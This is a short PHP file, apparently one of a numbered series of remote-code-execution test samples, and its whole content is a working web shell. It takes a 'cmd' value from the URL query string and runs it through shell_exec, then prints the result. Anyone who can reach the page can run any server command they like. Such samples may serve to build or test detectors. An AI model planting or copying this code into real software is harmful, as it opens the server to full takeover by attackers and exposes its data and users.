<?php
// RCE test variation #125
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>